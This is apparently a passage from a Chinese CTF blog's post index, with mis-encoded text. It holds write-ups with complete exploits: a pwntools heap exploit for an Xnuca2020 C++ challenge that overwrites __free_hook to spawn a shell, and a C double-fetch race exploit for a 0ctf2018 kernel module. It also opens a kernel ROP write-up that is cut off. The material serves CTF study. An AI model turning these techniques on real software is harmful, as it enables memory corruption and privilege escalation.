p.interactive()if __name__ == '__main__': # main(&quot;39.97.171.121&quot;) for i in range(0x20): try: main(0) except: p.close() cpp Heap exploiting is so boring . ä¸€é“c++å†™çš„èœå•é¢˜ï¼Œç”±äºæ²¡æœ‰å¯¹æŒ‡é’ˆçš„æ¸…é›¶å¯¼è‡´æˆ‘ä»¬å¯ä»¥ä¸€ç›´deleï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä¸€ç›´deleæ¥å¡«æ»¡tecacheï¼Œä»è€Œè¿›å…¥fastibinã€‚ é¢˜ç›®é™åˆ¶äº†mallocçš„sizeï¼Œä½†æˆ‘ä»¬å¯ä»¥åˆ©ç”¨basic_stringæ‰©å®¹çš„è§„åˆ™æ¥è§¦å‘malloc_consolidateï¼Œæ¥å¾—åˆ°å­˜æ”¾æœ‰main_arenaçš„binsã€‚ 12345678910111213141516create_des()create_des()create_des()write_des('a'*0x30)for i in range(8): del_des()write_des('a'*0x60)for i in range(8): del_des()write_des('a'*0x70)for i in range(8): del_des()write_des('a'*0x50)for i in range(8): del_des()write_des('a'*0x500) æ•ˆæœï¼š 12345678910111213141516171819202122232425262728pwndbg&gt; binstcachebins0x20 [ 2]: 0x555a28604e90 â—‚â€” 0x555a28604e900x30 [ 1]: 0x555a28604f60 â—‚â€” 0x00x40 [ 7]: 0x555a28604eb0 â€”â–¸ 0x7f6268435cd0 (main_arena+144) â€”â–¸ 0x7f6268435cc0 (main_arena+128) â€”â–¸ 0x7f6268435cb0 (main_arena+112) â€”â–¸ 0x7f6268435ca0 (main_arena+96) â€”â–¸ 0x555a28605870 â—‚â€” 0x00x50 [ 1]: 0x555a28604f90 â—‚â€” 0x00x60 [ 7]: 0x555a28605160 â€”â–¸ 0x555a28604ea0 â—‚â€” 0x00x70 [ 7]: 0x555a28605070 â€”â–¸ 0x7f6268435de0 (main_arena+416) â€”â–¸ 0x7f6268435dd0 (main_arena+400) â€”â–¸ 0x7f6268435dc0 (main_arena+384) â€”â–¸ 0x7f6268435db0 (main_arena+368) â€”â–¸ 0x7f6268435da0 (main_arena+352) â€”â–¸ 0x7f6268435d90 (main_arena+336) â€”â–¸ 0x7f6268435d80 (main_arena+320) â—‚â€” ...0x80 [ 7]: 0x555a286050e0 â—‚â€” 0x00x90 [ 1]: 0x555a28604fe0 â—‚â€” 0x00x100 [ 1]: 0x555a286051c0 â—‚â€” 0x00x1f0 [ 1]: 0x555a286052c0 â—‚â€” 0x00x3d0 [ 1]: 0x555a286054b0 â—‚â€” 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbins0x40: 0x555a28604ea0 â€”â–¸ 0x7f6268435cd0 (main_arena+144) â—‚â€” 0x555a28604ea00x150: 0x555a28605060 â€”â–¸ 0x7f6268435de0 (main_arena+416) â—‚â€” 0x555a28605060 /* '`P`(ZU' */largebinsempty ä¹‹åå°±æ˜¯åŠ«æŒstdoutæ³„éœ²äº†ï¼Œåˆ©ç”¨small binå’Œ0x40çš„tecacheçš„overlopæ”¹main_arenaçš„åä½ä¸¤ä¸ªå­—èŠ‚ï¼Œä½†è¦å…ˆæŠŠ0x20çš„tecacheç”³è¯·å‡ºæ¥ã€‚ leakçš„æ—¶å€™æœ‰ä¸ªé—®é¢˜è¦æ³¨æ„ï¼š 123456789101112131415161718192021222324252627282930313233pwndbg&gt; binstcachebins0x30 [ 1]: 0x561f2bafef60 â—‚â€” 0x00x40 [ 7]: 0x561f2bafeeb0 â€”â–¸ 0x7fc5c83ae758 (_IO_2_1_stderr_+216) â€”â–¸ 0x7fc5c83aa2a0 (_IO_file_jumps) â—‚â€” 0x00x50 [ 1]: 0x561f2bafef90 â—‚â€” 0x00x60 [ 7]: 0x561f2baff160 â€”â–¸ 0x561f2bafeea0 â—‚â€” 0x00x70 [ 7]: 0x561f2baff070 â€”â–¸ 0x7fc5c83adde0 (main_arena+416) â€”â–¸ 0x7fc5c83addd0 (main_arena+400) â€”â–¸ 0x7fc5c83addc0 (main_arena+384) â€”â–¸ 0x7fc5c83addb0 (main_arena+368) â€”â–¸ 0x7fc5c83adda0 (main_arena+352) â€”â–¸ 0x7fc5c83add90 (main_arena+336) â€”â–¸ 0x7fc5c83add80 (main_arena+320) â—‚â€” ...0x80 [ 7]: 0x561f2baff0e0 â—‚â€” 0x00x90 [ 1]: 0x561f2bafefe0 â—‚â€” 0x00x100 [ 1]: 0x561f2baff1c0 â—‚â€” 0x00x1f0 [ 1]: 0x561f2baff2c0 â—‚â€” 0x00x3d0 [ 1]: 0x561f2baff4b0 â—‚â€” 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x561f2bafeec0 â€”â–¸ 0x7fc5c83adca0 (main_arena+96) â—‚â€” 0x561f2bafeec0smallbins0x150: 0x561f2baff060 â€”â–¸ 0x7fc5c83adde0 (main_arena+416) â—‚â€” 0x561f2baff060largebinsemptypwndbg&gt; x/20gx 0x561f2bafeeb0-0x100x561f2bafeea0: 0x0000000000000000 0x00000000000000210x561f2bafeeb0: 0x00007fc5c83ae758 0x00007fc5c83adcd00x561f2bafeec0: 0x6161616161616161 0x00000000000000210x561f2bafeed0: 0x00007fc5c83adca0 0x00007fc5c83adca0 åœ¨æ”¹äº†main_arenaä¹‹åunsortedbiné‡Œçš„binå’Œ0x40çš„ç¬¬ä¸€ä¸ªtecacheæ˜¯overlopçš„ï¼Œè¿™æ—¶å¦‚æœæˆ‘ä»¬ç›´æ¥å–0x40çš„tecacheå’Œè¯å°±åº”æ³¨æ„ä¸è¦æ”¹åunsorted binçš„ç»“æ„ï¼Œæˆ–è€…æˆ‘ä»¬å¯ä»¥å…ˆæŠŠunsortedbinç”³è¯·ç©ºåœ¨å–0x40çš„tecacheï¼Œè¿™æ ·å°±æ²¡ä»€ä¹ˆé—®é¢˜äº†ã€‚ exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566from pwn import *context.log_level='debug'def cmd(command): p.recvuntil(&quot;[B]ye&quot;) p.send(str(command))def create_des(): cmd('C')def write_des(content): cmd('W') sleep(0.1) p.sendline(content)def del_des(): cmd('D')def main(host,port=1234): global p if host: p=remote(host,port) else: p=process(&quot;./cpp&quot;,env={&quot;LD_PRELOAD&quot;:&quot;/home/an9ela/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so&quot;}) create_des() create_des() create_des() write_des('a'*0x30) for i in range(8): del_des() write_des('a'*0x60) for i in range(8): del_des() write_des('a'*0x70) for i in range(8): del_des() write_des('a'*0x50) for i in range(8): del_des() write_des('a'*0x500) write_des('\\x00'*8) write_des('\\x00'*8) # for i in range(4): # del_des() gdb.attach(p) stdout=int(raw_input(&quot;input: &quot;),16) write_des(p16(stdout-8)) write_des('\\x00') write_des(p64(0)*3+p64(0x21)+'\\x00'*0x10) write_des('a'*8+p64(0xfbad1800)+p64(0)*3+'\\x00') libc.address=u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))-0x3ed8b0 success(&quot;libc: &quot;+hex(libc.address)) write_des(p64(libc.sym['__free_hook'])) write_des('a'*0x60) write_des(p64(libc.sym['system'])+'\\x00'*0x58) write_des('/bin/sh'+'\\x00'*0x20) gdb.attach(p) p.interactive()if __name__ == '__main__': libc=ELF(&quot;/home/an9ela/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so&quot;) main(0)","link":"/2020/11/04/Xnuca2020%E7%BA%BF%E4%B8%8A%E8%B5%9B/"},{"title":"I am back","text":"è€ƒç ”ç»“æŸæœ‰ä¸€æ®µæ—¶é—´äº†ï¼Œä¹Ÿä¼‘æ¯è°ƒæ•´çš„å·®ä¸å¤šäº†ï¼Œæ˜¯æ—¶å€™é‡å¯æ›´æ–°è®¡åˆ’äº†ğŸ›¡","link":"/2022/02/21/iamback/"},{"title":"kernel_pwn Double_fetch","text":"kernel_pwn Double_fetch wikiä¸Škerneléƒ¨åˆ†çš„ç¬¬ä¸‰é“é¢˜ç›®ï¼Œæ¥è‡ª0ctf2018 final_baby è¿™é¢˜ä¸å¤ªä¸€æ ·çš„æ˜¯æ²¡æœ‰ç»™bzlmage,åªç»™äº†.koæ–‡ä»¶å’Œcore.cpioã€‚é€šè¿‡idaæ‰“å¼€koæ–‡ä»¶æŸ¥çœ‹hex viewå¯ä»¥å‘ç°å†…æ ¸ç‰ˆæœ¬ä¸º4.15.0-22-generic SMP mod_unloadã€‚æˆ‘å·æ‡’ç›´æ¥ä»p4ndaå¸ˆå‚…çš„githubä¸Šæäº†ä¸€ä¸ªï¼Œå†™ä¸ªshellæ–‡ä»¶å°±å¯ä»¥qemuèµ·äº†ã€‚ .koæ–‡ä»¶åˆ†æï¼š 123456__int64 init_module(){ _fentry__(); misc_register(&amp;baby); return 0LL;} init_module()é‡Œæ‰§è¡Œäº†misc_register()åœ¨/devç›®å½•ä¸‹å»ºç«‹äº†babyç»“ç‚¹ï¼Œå¹¶å®šä¹‰ä¸ºæ‚é¡¹è®¾å¤‡ï¼Œè¯¥è®¾å¤‡å…±äº«ä¸»è®¾å¤‡å·å’Œopenå‡½æ•°è°ƒç”¨ï¼Œæœ‰ç‚¹ç±»ä¼¼ä¸Šä¸€ç¯‡çš„coreã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344__int64 __fastcall baby_ioctl(__int64 a1, int a2){ __int64 v2; // rdx __int64 v3; // rcx __int64 result; // rax unsigned __int64 v5; // kr10_8 int i; // [rsp-5Ch] [rbp-5Ch] __int64 v7; // [rsp-58h] [rbp-58h] _fentry__(); v7 = v2; if ( a2 == 0x6666 ) { printk(&quot;Your flag is at %px! But I don't think you know it's content\\n&quot;, flag, v2, v3); result = 0LL; } else if ( a2 == 0x1337 &amp;&amp; (unsigned __int8)_chk_range_not_ok( v2, 16LL, *(_QWORD *)(__readgsqword((unsigned __int64)&amp;current_task) + 4952)) != 1 &amp;&amp; (unsigned __int8)_chk_range_not_ok( *(_QWORD *)v7, *(int *)(v7 + 8), *(_QWORD *)(__readgsqword((unsigned __int64)&amp;current_task) + 4952)) != 1 &amp;&amp; *(_DWORD *)(v7 + 8) == strlen(flag) ) { for ( i = 0; ; ++i ) { v5 = strlen(flag) + 1; if ( i &gt;= v5 - 1 ) break; if ( *(_BYTE *)(*(_QWORD *)v7 + i) != flag[i] ) return 22LL; } printk(&quot;Looks like the flag is not a secret anymore. So here is it %s\\n&quot;, flag, flag, ~v5); result = 0LL; } else { result = 14LL; } return result;} baby_ioctl()å°±ç±»ä¼¼äºmainå‡½æ•°äº†ï¼Œä¸»è¦å®Œæˆçš„åŠŸèƒ½æ˜¯å¯¹ç¬¬äºŒä¸ªå‚æ•°è¿›è¡Œæ£€æŸ¥ï¼Œè‹¥ä¸º0x6666ï¼Œå°±è¾“å‡ºå†…æ ¸é‡Œflagçš„åœ°å€ï¼›å¦‚æœä¸º0x1337å°±ä¼šè¿›è¡Œä¸‰ä¸ªæ£€æŸ¥_chk_range_not_ok()å‡½æ•°å°±æ˜¯æ£€æŸ¥a1+a2&gt;a3æ˜¯å¦æˆç«‹ã€‚ å¯„å­˜å™¨çŠ¶æ€ï¼š 123456$rdx : 0x00007ffffffff000 â†’ 0x00007ffffffff000$rsi : 0x0000000000000010 â†’ 0x0000000000000010$rdi : 0x00007ffd64e1d780 â†’ 0x00007ffd64e1d790 â†’ 0x6373205d30383138 â†’ 0x6373205d30383138gefâ¤ x/20gx 0x00007ffd64e1d7800x7ffd64e1d780: 0x00007ffd64e1d790 0x0000000000000021 //ä¼ å…¥çš„ç»“æ„ä½“ é€šè¿‡è°ƒè¯•æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œv2/v7å°±æ˜¯æ˜¯æˆ‘ä»¬ä¼ å…¥çš„ç»“æ„ä½“ï¼Œè€Œa3åˆ™æ˜¯ä¸€ä¸ªå›ºå®šçš„åœ°å€0x7ffffffff000ï¼Œè¿™ä¸ªåœ°å€æ˜¯ç”¨æˆ·ç©ºé—´å’Œå†…æ ¸ç©ºé—´çš„è¾¹ç•Œåœ°å€ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æƒ³åˆ°è¯¥å‡½æ•°å°±æ˜¯åˆ¤æ–­a1+a2çš„æ˜¯å¦åœ¨ç”¨æˆ·ç©ºé—´ã€‚ç»“æ„ä½“ï¼š 1234struct attr{ char *flag; //flagçš„åœ°å€ size_t flag_len;}; ç¬¬ä¸€ä¸ªcheckæ˜¯æˆ‘ä»¬è¾“å…¥çš„ç»“æ„ä½“æ˜¯å¦åœ¨ç”¨æˆ·ç©ºé—´ï¼Œç¬¬äºŒä¸ªcheckæ˜¯flagæ˜¯å¦åœ¨ç”¨æˆ·ç©ºé—´ï¼Œç¬¬ä¸‰ä¸ªcheckæ˜¯æˆ‘ä»¬ç»“æ„ä½“çš„flag_lenæ˜¯å¦å’ŒçœŸæ­£flagé•¿åº¦ç›¸ç­‰ã€‚è¿‡äº†checkä¹‹åä¼šå°†æˆ‘ä»¬è¾“å…¥çš„flagçš„åœ°å€é‡Œçš„å†…å®¹å’Œå†…æ ¸é‡Œçš„flagè¿›è¡Œæ¯”è¾ƒï¼Œç›¸åŒæœ€ç»ˆå°±ä¼šè¾“å‡ºflagã€‚åˆ†æä¸‹æ¥æˆ‘ä»¬å‘ç°ï¼Œå†…æ ¸å¾—åˆ°çš„æ˜¯ä¸€ä¸ªç»“æ„ä½“çš„æŒ‡é’ˆï¼Œè€Œç»“æ„ä½“çš„å†…å®¹æ˜¯å­˜æ”¾åœ¨ç”¨æˆ·ç©ºé—´çš„ã€‚æˆ‘ä»¬å¯ä»¥å…ˆé€šè¿‡0x6666å¾—åˆ°flagåœ¨å†…æ ¸é‡Œçš„åœ°å€ï¼Œä½†å¦‚æœæˆ‘ä»¬åœ¨ä¼ å…¥çš„ç»“æ„ä½“é‡Œå†™å…¥è¯¥åœ°å€çš„è¯å°±æ— æ³•é€šè¿‡ç¬¬äºŒä¸ªcheckï¼ˆå› ä¸ºè¯¥flagåœ¨å†…æ ¸ç©ºé—´ï¼‰ã€‚è¿™é‡Œå°±ç”¨åˆ°äº†doubel_fetchæ–¹æ³•ã€‚åŸç†æ‘˜è‡ªCTF_WIKIï¼š 123Double Fetch ä»æ¼æ´åŸç†ä¸Šå±äºæ¡ä»¶ç«äº‰æ¼æ´ï¼Œæ˜¯ä¸€ç§å†…æ ¸æ€ä¸ç”¨æˆ·æ€ä¹‹é—´çš„æ•°æ®è®¿é—®ç«äº‰ã€‚åœ¨ Linux ç­‰ç°ä»£æ“ä½œç³»ç»Ÿä¸­ï¼Œè™šæ‹Ÿå†…å­˜åœ°å€é€šå¸¸è¢«åˆ’åˆ†ä¸ºå†…æ ¸ç©ºé—´å’Œç”¨æˆ·ç©ºé—´ã€‚å†…æ ¸ç©ºé—´è´Ÿè´£è¿è¡Œå†…æ ¸ä»£ç ã€é©±åŠ¨æ¨¡å—ä»£ç ç­‰ï¼Œæƒé™è¾ƒé«˜ã€‚è€Œç”¨æˆ·ç©ºé—´è¿è¡Œç”¨æˆ·ä»£ç ï¼Œå¹¶é€šè¿‡ç³»ç»Ÿè°ƒç”¨è¿›å…¥å†…æ ¸å®Œæˆç›¸å…³åŠŸèƒ½ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œç”¨æˆ·ç©ºé—´å‘å†…æ ¸ä¼ é€’æ•°æ®æ—¶ï¼Œå†…æ ¸å…ˆé€šè¿‡é€šè¿‡ copy_from_user ç­‰æ‹·è´å‡½æ•°å°†ç”¨æˆ·æ•°æ®æ‹·è´è‡³å†…æ ¸ç©ºé—´è¿›è¡Œæ ¡éªŒåŠç›¸å…³å¤„ç†ï¼Œä½†åœ¨è¾“å…¥æ•°æ®è¾ƒä¸ºå¤æ‚æ—¶ï¼Œå†…æ ¸å¯èƒ½åªå¼•ç”¨å…¶æŒ‡é’ˆï¼Œè€Œå°†æ•°æ®æš‚æ—¶ä¿å­˜åœ¨ç”¨æˆ·ç©ºé—´è¿›è¡Œåç»­å¤„ç†ã€‚æ­¤æ—¶ï¼Œè¯¥æ•°æ®å­˜åœ¨è¢«å…¶ä»–æ¶æ„çº¿ç¨‹ç¯¡æ”¹é£é™©ï¼Œé€ æˆå†…æ ¸éªŒè¯é€šè¿‡æ•°æ®ä¸å®é™…ä½¿ç”¨æ•°æ®ä¸ä¸€è‡´ï¼Œå¯¼è‡´å†…æ ¸ä»£ç æ‰§è¡Œå¼‚å¸¸ã€‚ å› æ­¤æˆ‘ä»¬å¯ä»¥å…ˆåœ¨ç»“æ„ä½“çš„flagä½ç½®å†™å…¥ç”¨æˆ·ç©ºé—´çš„åœ°å€ï¼Œåœ¨åˆ›å»ºä¸€ä¸ªæ¶æ„çº¿ç¨‹ï¼Œè¯¥çº¿ç¨‹çš„ä»»åŠ¡å°±æ˜¯ä¸æ–­çš„ä¿®æ”¹æˆ‘ä»¬çš„flagåœ°å€ä¸ºå†…æ ¸åœ°å€ï¼Œå¦‚æœè¯¥ä¿®æ”¹æ“ä½œå‘ç”Ÿåœ¨é€šè¿‡checkåï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡åé¢çš„ä¾æ¬¡æ¯”è¾ƒä»è€Œè¾“å‡ºflagã€‚ exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;#include&lt;unistd.h&gt;#include&lt;sys/types.h&gt;#include&lt;sys/ioctl.h&gt;#include&lt;sys/stat.h&gt;#include&lt;fcntl.h&gt;#include&lt;inttypes.h&gt;#include&lt;pthread.h&gt;int finish=0;uint64_t addr;struct attr{ char *flag; int len;};void change_attr(void *s){ struct attr *s1=s; if(finish==0){ s1-&gt;flag=addr; }}int main(){ char buf[0x1000]={0}; char *ptr; struct attr t; pthread_t t1; int fd=open(&quot;/dev/baby&quot;,0); ioctl(fd,0x6666); setvbuf(stdin,0,2,0); setvbuf(stdout,0,2,0); setvbuf(stderr,0,2,0); system(&quot;dmesg &gt; /tmp/record.txt&quot;); int addr_fd=open(&quot;/tmp/record.txt&quot;,O_RDONLY); lseek(addr_fd,-0x1000,SEEK_END); //control the position of r/w read(addr_fd,buf,0x1000); close(addr_fd); ptr=strstr(buf,&quot;Your flag is at &quot;); if(ptr==0){ puts(&quot;Not found&quot;); exit(0); } else{ ptr+=16; addr=strtoull(ptr,ptr+16,16); printf(&quot;flag addr: %p&quot;,addr); } t.flag=buf; t.len=33; pthread_create(&amp;t1,NULL,change_attr,&amp;t); //åˆ›å»ºçº¿ç¨‹ for(int i=0;i&lt;0x500;i++){ ioctl(fd,0x1337,&amp;t); t.flag=buf; //æ›´æ–°flagåœ°å€å¢å¤§æˆåŠŸæ¦‚ç‡ } finish=1; pthread_join(t1,NULL); //ç­‰å¾…çº¿ç¨‹ç»“æŸ close(fd); system(&quot;dmesg | grep flag&quot;); return 0;} è¡¥å……ï¼šç¼–è¯‘æ—¶è¦å¤šåŠ -pthreadé€‰é¡¹gcc exp.c -pthread -static -o exploitgef attachçš„å‘½ä»¤gef-remote -q localhost:1234å…³é—­åœ°å€éšæœºåŒ–æ–¹æ³•ï¼šåœ¨-appendæœ€ååŠ ä¸Š nokaslr å‚è€ƒï¼šhttps://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/double-fetch-zh/https://x3h1n.github.io/2019/08/27/20180ctf-final-baby/","link":"/2020/11/08/kernel_pwn(2)/"},{"title":"kernel_pwn ROP","text":"kernel é€šå¸¸ä¸€ä¸ªå†…æ ¸ç”±è´Ÿè´£å“åº”ä¸­æ–­çš„ä¸­æ–­æœåŠ¡ç¨‹åºï¼Œè´Ÿè´£ç®¡ç†å¤šä¸ªè¿›ç¨‹ä»è€Œåˆ†äº«å¤„ç†å™¨æ—¶é—´çš„è°ƒåº¦ç¨‹åºï¼Œè´Ÿè´£ç®¡ç†è¿›ç¨‹åœ°å€ç©ºé—´çš„å†…å­˜ç®¡ç†ç¨‹åºï¼Œè¿›ç¨‹é—´é€šè®¯ç­‰ç³»ç»ŸæœåŠ¡ç¨‹åºå…±åŒç»„æˆã€‚ â€“linuxå†…æ ¸è®¾è®¡ä¸å®ç° ä¸€ç›´æƒ³å­¦kernel pwnï¼Œä½†è¿Ÿè¿Ÿæ²¡æœ‰å¼€å§‹ï¼ˆæ‡’ğŸ¤¦ï¼‰ã€‚æœ€è¿‘åˆå¿ƒè¡€æ¥æ½®ï¼Œç¿»å¼€äº†linuxå†…æ ¸è®¾è®¡ä¸å®ç°è¿™æœ¬ä¹¦ï¼Œå‡†å¤‡çœ‹è¿™æœ¬æ¥å…¥é—¨kernelã€‚è¿™å°†ä¼šæ˜¯ä¸€ä¸ªç³»åˆ—ï¼Œè®°å½•ä¸‹è‡ªå·±çš„å­¦ä¹ è¿‡ç¨‹ï¼ˆè¯»ä¹¦ç¬”è®°+kernel_pwné¢˜ç›®å¤ç°ï¼‰ï¼Œå¸Œæœ›è‡ªå·±å¯ä»¥åšæŒä¸‹å»ğŸƒã€‚ kernelé¡¾åæ€ä¹‰æ˜¯æ“ä½œçš„æ ¸å¿ƒï¼Œå®ƒå…¶å®èµ·åˆ°äº†ä¸€ä¸ªæ‰¿ä¸Šï¼ˆç”¨æˆ·ç©ºé—´ï¼‰å¯ä¸‹ï¼ˆç¡¬ä»¶è®¾å¤‡ï¼‰çš„ä½œç”¨ã€‚åº”ç”¨ç¨‹åºé€šè¿‡ç³»ç»Ÿè°ƒç”¨æ¥ä¸å†…æ ¸é€šä¿¡ï¼Œå†…æ ¸é€šè¿‡å¤„ç†ä¸­æ–­ï¼ˆé€šè¿‡ä¸­æ–­å·æ‰¾ä¸­æ–­æœåŠ¡ç¨‹åºï¼‰æ¥ç®¡ç†ç³»ç»Ÿçš„ç¡¬ä»¶è®¾å¤‡ã€‚æ³¨æ„ï¼šå¾ˆå¤šæ“ä½œç³»ç»Ÿçš„ä¸­æ–­æœåŠ¡ç¨‹åºï¼ŒåŒ…æ‹¬linuxï¼Œéƒ½ä¸åœ¨è¿›ç¨‹ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼›è€Œæ˜¯åœ¨ä¸“é—¨çš„ä¸­æ–­ä¸Šä¸‹æ–‡ä¸­è¿è¡Œï¼Œä¸æ‰€æœ‰è¿›ç¨‹éƒ½æ— å…³ã€‚ kernel_pwn_ROP é¢˜ç›®æ¥è‡ªqwd2018_coreã€‚ å°±ctfé‡Œkernel pwnè€Œè¨€æˆ‘ä»¬æ‰€è¦åšçš„å°±æ˜¯ææƒï¼ˆå¾—åˆ°ä¸€ä¸ªrootæƒé™çš„è¿›ç¨‹ï¼‰ã€‚æŒ–æ˜å‡ºå­˜åœ¨äºkernelæ¨¡å—é‡Œçš„æ¼æ´å¹¶é€šè¿‡ç”¨æˆ·æ€çš„ç›¸åº”çš„ç³»ç»Ÿè°ƒç”¨è¿›åˆ°å†…æ ¸æ€ä¸­å»è§¦å‘æ¼æ´ä»è€Œåˆ°è¾¾ææƒçš„ç›®çš„ã€‚ç›´æ¥æ’¸é¢˜âœ”è§£å‹ä¹‹åå¯ä»¥çœ‹åˆ°è¿™äº›æ–‡ä»¶ï¼šbzImageï¼šå‹ç¼©åçš„å†…æ ¸é•œåƒvmlinuxï¼šç¼–è¯‘å‡ºçš„åŸå§‹å†…æ ¸æ–‡ä»¶ï¼Œæ²¡æœ‰è¢«å‹ç¼©è€Œä¸”æ˜¯é™æ€è¿æ¥çš„ã€‚.shï¼šqemuçš„å¯åŠ¨è„šæœ¬.cpioï¼šæ‰“åŒ…åçš„æ–‡ä»¶ç³»ç»Ÿ æˆ‘ä»¬é¦–å…ˆçœ‹ä¸‹.shæ–‡ä»¶ï¼š 12345678qemu-system-x86_64 \\-m 64M \\-kernel ./bzImage \\-initrd ./core.cpio \\-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \\-s \\-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\-nographic \\ è§£é‡Šä¸‹å‚æ•°ï¼š 1234567-m æŒ‡å®šå†…å­˜(RAM)å¤§å°-kernel æŒ‡å®šå†…æ ¸é•œåƒ-initrd æŒ‡å®šå†…æ ¸å¯åŠ¨çš„æ–‡ä»¶ç³»ç»Ÿ-qppend é™„åŠ é€‰é¡¹ æŒ‡å®šno kaslrå¯ä»¥å…³é—­åœ°å€éšæœºåŒ–-s ç›¸å½“äº-gdb tcp::1234ï¼Œå¯ä»¥ç”¨gdb ./vmlinuxè°ƒè¯•-smp ç”¨äºå£°æ˜æ‰€æœ‰å¯èƒ½ç”¨åˆ°çš„cpus, i.e. sockets cores threads = maxcpus.-cpu è®¾ç½®CPUçš„å®‰å…¨é€‰é¡¹ ä¿æŠ¤æœºåˆ¶ï¼šå¸¸è§çš„æœ‰kaslrï¼ˆåœ°å€éšæœºåŒ–ï¼‰ï¼Œsmep(å†…æ ¸æ€ä¸å¯æ‰§è¡Œç”¨æˆ·æ€çš„ä»£ç )ï¼Œsmap(å†…æ ¸æ€ä¸å¯è®¿é—®ç”¨æˆ·æ€çš„æ•°æ®)ã€‚ è§£é¢˜è¿‡ç¨‹ï¼šæ‹¿åˆ°è¿™äº›æ–‡ä»¶åé¦–å…ˆè¦åšçš„å°±æ˜¯è§£åŒ….cpioæ–‡ä»¶ï¼Œä½†ä¸è¦åœ¨å…±äº«æ–‡ä»¶å¤¹ä¸‹è¿›è¡Œæ­¤æ“ä½œï¼Œä¼šå¯¼è‡´è§£åŒ…çš„è½¯é“¾æ¥å‡ºé”™ã€‚æˆ‘ä¸€èˆ¬æ˜¯è¿™æ ·ï¼š 1234567891011cp give_to_player /home/an9ela/kernelcd /home/an9ela/kernel/give_to_playermkdir coremv core.cpio core.cpio.gzmv core.cpio.gz ./corecd coregunzip core.cpio.gzcpio -idmv &lt; core.cpiow //è§£åŒ…æ“ä½œfind . | cpio -o --format=newc &gt; ../core.cpio //æ‰“åŒ…æ“ä½œï¼Œè¿™é¢˜ç»™äº†gen_cpio.shç›´æ¥./gen_cpio core.cpio å¾—åˆ°æ–‡ä»¶ç³»ç»Ÿä¹‹åé¦–å…ˆè¦çœ‹çš„å°±æ˜¯Initæ–‡ä»¶äº†ï¼Œè¿™ä¸ªæ˜¯åˆå§‹åŒ–å†…æ ¸æ—¶æ‰€è¿›è¡Œçš„æ“ä½œâ€œ 1234567891011121314151617181920212223#!/bin/shmount -t proc proc /procmount -t sysfs sysfs /sysmount -t devtmpfs none /dev/sbin/mdev -smkdir -p /dev/ptsmount -vt devpts -o gid=4,mode=620 none /dev/ptschmod 666 /dev/ptmxcat /proc/kallsyms &gt; /tmp/kallsyms //å¤‡ä»½äº†kallsymsåˆ°tmpæ–‡ä»¶å¤¹ä¸‹echo 1 &gt; /proc/sys/kernel/kptr_restrict //å³æˆ‘ä»¬ä¸èƒ½é€šè¿‡/proc/kallsymsè·å¾—å‡½æ•°åœ°å€ï¼Œä½†/tmp/kallsymsæ˜¯ä¸å—å½±å“çš„echo 1 &gt; /proc/sys/kernel/dmesg_restrict //æ— æ³•é€šè¿‡dmesgæŸ¥çœ‹å†…æ ¸çš„è¾“å‡ºifconfig eth0 upudhcpc -i eth0ifconfig eth0 10.0.2.15 netmask 255.255.255.0route add default gw 10.0.2.2insmod /core.ko //æ’å…¥core.koæ¨¡å—ï¼Œè¯¥æ¨¡å—ä¹Ÿå³æˆ‘ä»¬è¦é‡ç‚¹åˆ†æçš„æ¨¡å—poweroff -d 120 -f &amp; //è¿™å¥è®¾ç½®äº†120sè‡ªåŠ¨å…³æœºï¼Œä¸ºä¸å½±å“è°ƒè¯•å¯ä»¥åˆ æ‰setsid /bin/cttyhack setuidgid 1000 /bin/sh //æˆ‘ä»¬çš„shellçš„uidgidä¸º1000ï¼Œrootä¸º0echo 'sh end!\\n'umount /procumount /syspoweroff -d 0 -f æ¥ä¸‹æ¥å°±è¦åˆ†æcore.koæ¨¡å—äº†ï¼Œå¯ä»¥ç”¨idaæ‰“å¼€ã€‚é¦–å…ˆæŸ¥çœ‹init_moduleå‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šåœ¨æ¨¡å—åŠ è½½æ—¶æ‰§è¡Œã€‚ 123456__int64 init_module(){ core_proc = proc_create(&quot;core&quot;, 438LL, 0LL, &amp;core_fops); printk(&amp;unk_2DE); return 0LL;} è¯¥å‡½æ•°è°ƒç”¨proc_createåˆ›å»ºäº†åä¸ºcoreçš„è™šæ‹Ÿæ–‡ä»¶ï¼Œåº”ç”¨å±‚é€šè¿‡è¯»å†™æ”¹æ–‡ä»¶å®ç°ä¸å†…æ ¸çš„äº¤äº’ã€‚å…¶ä¸­ç¬¬ä¸‰ä¸ªå‚æ•°file_operationså­˜å‚¨äº†å†…æ ¸æ¨¡å—æä¾›çš„å¯¹è®¾å¤‡è¿›è¡Œå„ç§æ“ä½œçš„å‡½æ•°æŒ‡é’ˆï¼Œå¯¹äºç”¨æˆ·æ€è€Œè¨€ä¹Ÿå¯ä»¥ç†è§£ä¸ºæˆ‘ä»¬å¯ä»¥é€šè¿‡coreæ–‡ä»¶èƒ½è¿›è¡Œé‚£äº›æ“ä½œã€‚ç‚¹è¿›å»fop 123.data:0000000000000438 dq offset core_write.data:0000000000000468 dq offset core_ioctl.data:0000000000000498 dq offset core_release å¯è§èƒ½æ‰§è¡Œçš„æ“ä½œä¸ºwrite,ioctl,release æ¥ä¸‹æ¥æ˜¯core_ioctlå‡½æ•°ï¼š 12345678910111213141516171819202122__int64 __fastcall core_ioctl(__int64 a1, int a2, __int64 a3){ 